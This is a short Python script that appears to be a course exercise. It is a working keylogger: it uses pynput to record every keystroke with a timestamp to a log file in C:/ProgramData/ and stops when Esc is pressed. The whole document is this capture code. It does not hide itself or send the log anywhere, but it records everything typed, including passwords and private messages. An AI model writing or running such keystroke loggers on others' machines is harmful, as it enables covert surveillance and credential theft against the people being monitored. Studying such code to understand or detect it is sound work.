from pynput.keyboard import Key, Listener
import logging

log_dir = "C:/ProgramData/"

logging.basicConfig(filename=(log_dir + "udemykeylog2.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(key)

def on_release(key):

    if key == Key.esc:
        return False

with Listener (on_press = on_press, on_release = on_release) as listener:

    listener.join()
